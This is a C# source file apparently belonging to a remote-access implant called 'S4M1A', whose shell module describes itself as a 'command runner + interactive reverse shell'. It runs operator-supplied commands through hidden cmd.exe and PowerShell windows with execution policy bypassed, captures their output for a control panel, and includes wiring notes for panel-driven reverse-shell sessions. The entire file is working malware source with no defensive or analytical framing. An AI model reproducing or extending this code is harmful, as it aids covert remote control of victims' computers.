using System;
using System.Diagnostics;
using System.Text;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A Shell v2.0 - command runner + interactive reverse shell
    //
    //  Contract (used by Commands.cs):
    //    Shell.Run(string cmd, bool powershell) -> string  (one-shot, 30s)
    //
    //  Interactive reverse shell (piped stdin/stdout session):
    //    Shell.StartInteractive(bool ps) -> "ok" | "ERR: ..."
    //    Shell.FeedInput(string line)    -> "ok" | "ERR: ..."
    //    Shell.ReadOutput()              -> string (drains buffer)
    //    Shell.StopInteractive()         -> "ok"
    //
    //  Optional Commands.cs wiring for panel-driven interactive sessions
    //  (add these cases to the switch):
    //    case "revstart": return Ok(Shell.StartInteractive(args == "ps"));
    //    case "revfeed":  return Ok(Shell.FeedInput(args));
    //    case "revpull":  return Ok(Shell.ReadOutput());
    //    case "revstop":  return Ok(Shell.StopInteractive());
    // =====================================================================

    public static class Shell
    {
        private const int RunTimeoutMs = 30000;
        private const int MaxOutputChars = 512 * 1024;   // 512 KB cap
        private const int MaxTailChars   = 256 * 1024;   // interactive buffer

        // ------------------------- one-shot runner -------------------------

        public static string Run(string cmd, bool powershell)
        {
            if (string.IsNullOrWhiteSpace(cmd)) return "";
            try
            {
                ProcessStartInfo psi = BaseInfo();
                psi.FileName = powershell ? "powershell.exe" : "cmd.exe";
                if (powershell)
                {
                    // escape embedded quotes for the -Command wrapper
                    string inner = cmd.Replace("\"", "\\\"");
                    psi.Arguments = "-NoLogo -NoProfile -NonInteractive " +
                                    "-ExecutionPolicy Bypass -Command \"" + inner + "\"";
                }
                else
                {
                    psi.Arguments = "/c " + cmd;
                }

                StringBuilder output = new StringBuilder();
                using (Process p = new Process())
                {
                    p.StartInfo = psi;
                    p.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
                    {
                        if (e.Data != null) AppendLimited(output, e.Data + "\r\n");
                    };
                    p.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
                    {
                        if (e.Data != null) AppendLimited(output, e.Data + "\r\n");
                    };

                    if (!p.Start()) return "ERR: failed to start process";

                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();

                    if (!p.WaitForExit(RunTimeoutMs))
                    {
                        try { p.Kill(); } catch { }
                        p.WaitForExit(500);
                        AppendLimited(output, "\r\n[process killed: timeout]\r\n");
                    }
                    else
                    {
                        p.WaitForExit(); // flush remaining async output
                    }
                    return output.ToString();
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        // ------------------------- interactive session -------------------------

        private static Process _iProc;
        private static readonly object _iLock = new object();
        private static StringBuilder _iBuffer = new StringBuilder();

        public static string StartInteractive(bool powershell)
        {
            StopInteractive();
            try
            {
                ProcessStartInfo psi = BaseInfo();
                psi.FileName = powershell ? "powershell.exe" : "cmd.exe";
                psi.Arguments = powershell
                    ? "-NoLogo -NoProfile -ExecutionPolicy Bypass"
                    : "";

                _iProc = new Process();
                _iProc.StartInfo = psi;
                _iProc.OutputDataReceived += delegate(object s, DataReceivedEventArgs e)
                {
                    if (e.Data != null)
                    {
                        lock (_iLock)
                        {
                            if (_iBuffer.Length > MaxTailChars)
                                _iBuffer.Remove(0, _iBuffer.Length - MaxTailChars);
                            _iBuffer.Append(e.Data).Append("\r\n");
                        }
                    }
                };
                _iProc.ErrorDataReceived += delegate(object s, DataReceivedEventArgs e)
                {
                    if (e.Data != null)
                    {
                        lock (_iLock)
                        {
                            if (_iBuffer.Length > MaxTailChars)
                                _iBuffer.Remove(0, _iBuffer.Length - MaxTailChars);
                            _iBuffer.Append(e.Data).Append("\r\n");
                        }
                    }
                };

                if (!_iProc.Start()) { _iProc = null; return "ERR: failed to start shell"; }
                _iProc.BeginOutputReadLine();
                _iProc.BeginErrorReadLine();
                lock (_iLock) { _iBuffer.Clear(); }
                return "ok";
            }
            catch (Exception ex)
            {
                _iProc = null;
                return "ERR: " + ex.Message;
            }
        }

        public static string FeedInput(string line)
        {
            if (_iProc == null || _iProc.HasExited) return "ERR: shell not running";
            try
            {
                _iProc.StandardInput.WriteLine(line ?? "");
                _iProc.StandardInput.Flush();
                return "ok";
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string ReadOutput()
        {
            lock (_iLock)
            {
                if (_iBuffer.Length == 0) return "";
                string s = _iBuffer.ToString();
                _iBuffer.Clear();
                return s;
            }
        }

        public static string StopInteractive()
        {
            if (_iProc == null) return "already stopped";
            try { _iProc.StandardInput.Close(); } catch { }
            try
            {
                if (!_iProc.WaitForExit(2000)) _iProc.Kill();
            }
            catch { }
            _iProc.Dispose();
            _iProc = null;
            lock (_iLock) _iBuffer.Clear();
            return "ok";
        }

        // ------------------------- helpers -------------------------

        private static ProcessStartInfo BaseInfo()
        {
            return new ProcessStartInfo
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                RedirectStandardInput = true
            };
        }

        private static void AppendLimited(StringBuilder sb, string text)
        {
            if (sb.Length >= MaxOutputChars) return;
            if (sb.Length + text.Length > MaxOutputChars)
            {
                sb.Append(text.Substring(0, MaxOutputChars - sb.Length));
                sb.Append("\r\n[output truncated]\r\n");
            }
            else
            {
                sb.Append(text);
            }
        }
    }
}